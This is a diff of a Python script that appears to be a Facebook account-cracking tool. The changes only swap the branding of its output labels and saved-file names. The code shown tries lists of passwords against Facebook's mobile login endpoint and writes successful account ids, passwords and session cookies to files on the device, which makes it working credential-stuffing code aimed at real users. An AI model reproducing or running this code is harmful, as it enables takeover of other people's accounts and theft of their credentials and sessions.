@@ -1954,17 +1954,17 @@ def ffb(ids,names,passlist):
                         complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         ASX=str(session.cookies)
                         if "c_user" in ASX:
-                                print('\r\r\033[1;32m [SADAM-OK] %s | %s'%(ids,pas))
+                                print('\r\r\033[1;32m [Alose-OK] %s | %s'%(ids,pas))
                                 dc=dict(session.cookies)
                                 coki=";".join([k+"="+v for k,v in dc.items()])
-                                open('/sdcard/SADAM-COOKIE.txt','a').write(coki+'\n')
-                                open('/sdcard/SADAM-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open('/sdcard/Alose-COOKIE.txt','a').write(coki+'\n')
+                                open('/sdcard/Alosr-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in ASX:
                                 if 'y' in pcp:
                                         print('\r\r\x1b[38;5;208m [SADAM-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SADAM-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/Alose-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -1979,7 +1979,7 @@ def api(ids,names,passlist):
                 try:
                         global ok,loop,lim
                         p=round(loop*100/lim,2)
-                        sys.stdout.write('\r\r\033[1;37m [SADAM] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [Alose] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
